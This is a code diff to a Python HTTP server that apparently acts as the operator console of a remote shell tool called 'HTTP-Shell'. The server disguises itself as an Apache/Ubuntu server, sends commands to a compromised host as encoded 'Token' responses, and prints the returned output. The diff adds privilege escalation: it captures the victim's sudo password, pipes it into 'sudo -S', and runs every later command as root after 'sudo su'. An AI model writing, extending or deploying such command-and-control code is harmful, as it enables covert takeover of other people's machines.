@@ -12,6 +12,7 @@ import neotermcolor
 from neotermcolor import colored
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
+sudo = False ; root = False
 command = None ; prompt = None
 first_run = True ; noerror = True
 local_path = None ; remote_path = None
@@ -73,8 +74,8 @@ class MyServer(BaseHTTPRequestHandler):
             pass
 
     def do_GET(self):
-        global prompt ; global first_run ; global noerror
-        global local_path ; global remote_path ; global command
+        global prompt ; global first_run ; global noerror ; global root
+        global local_path ; global remote_path ; global command ; global sudo
         self.server_version = "Apache/2.4.18"
         self.sys_version = "(Ubuntu)"
         try:
@@ -89,7 +90,10 @@ class MyServer(BaseHTTPRequestHandler):
 
             elif self.path == "/api/token":
                 while True:
-                    whoami = prompt.split("!")[0].split("@")[0]
+                    if root:
+                        whoami = "root"
+                    else:
+                        whoami = prompt.split("!")[0].split("@")[0]
                     hostname = prompt.split("!")[0].split("@")[1]
                     path = prompt.split("!")[-1]
                     cinput = (colored(" [HTTP-Shell] ", "grey", "on_green")) ; cinput += (colored(" ", "green", "on_blue"))
@@ -126,10 +130,22 @@ class MyServer(BaseHTTPRequestHandler):
 
                     if "sudo" in command.split()[0]:
                         if not ":" in path:
-                            old_cmd = command.split()[1]
-                            print (colored(f"[sudo] write password for {str(whoami).rstrip()} on next command:\n","red"))
-                            sudo_pass = input(cinput + "\001\033[0m\002")
-                            command = str("echo " + '"' + sudo_pass + '"' + " | " + "sudo -S " + old_cmd)
+                            args = shlex.split(command)
+                            if len(args) < 2:
+                                print(colored("[!] Usage: sudo command or sudo su\n","red"))
+                                continue
+                            else:
+                                if not sudo:
+                                    old_cmd = ' '.join(args[1:])
+                                    print (colored(f"[sudo] write password for {str(whoami).rstrip()} on next command:\n","red"))
+                                    sudo_pass = input(cinput + "\001\033[0m\002")
+                                    command = str("echo " + '"' + sudo_pass + '"' + " | " + "sudo -S " + old_cmd)
+                                    sudo = True
+                                else:
+                                    old_cmd = ' '.join(args[1:])
+                                    command = str("echo '\n'" + " | " + "sudo -S " + old_cmd)
+                                if "su" in args:
+                                    root = True
 
                     if "upload" in command.split()[0]:
                         args = shlex.split(command)
@@ -164,13 +180,17 @@ class MyServer(BaseHTTPRequestHandler):
                         noerror = False ; command = None
 
                     if command is not None:
+                        if root and not "cd" in command:
+                            old_cmd = command
+                            command = str("echo ''" + " | " + "sudo -S " + old_cmd)
+
                         first_run = False
                         noerror = True
                         encoded_command = "Token: "
                         encoded_command += self.encode_reversed_base64url(command)
                         self._set_headers()
                         self.wfile.write(encoded_command.encode("utf-8"))
-                        
+
                         if command == "exit":
                             print (colored("[!] Exiting..\n", "red"))
                             exit(0)
@@ -218,6 +238,8 @@ class MyServer(BaseHTTPRequestHandler):
                 return
 
             elif self.path == "/api/debug":
+                if decoded_payload == None:
+                    decoded_payload = "HTTPShellNull"
                 if not first_run and command is not None:
                     if decoded_payload == "HTTPShellNull":
                         print()
@@ -226,13 +248,13 @@ class MyServer(BaseHTTPRequestHandler):
                         filtered_lines = [line for line in lines if "[sudo]" not in line]
                         decoded_payload = "\n".join(filtered_lines)
                         print(colored(decoded_payload.rstrip()+"\n", "yellow"))
-                    elif decoded_payload == None:
-                        print()
                     else:
                         print(colored(decoded_payload.rstrip()+"\n", "yellow"))
                 self.wfile.write(response.encode())
 
             elif self.path == "/api/error":
+                if decoded_payload == None:
+                    decoded_payload = "HTTPShellNull"
                 if noerror and command is not None:
                     if command == "HTTPShellNull":
                         pass
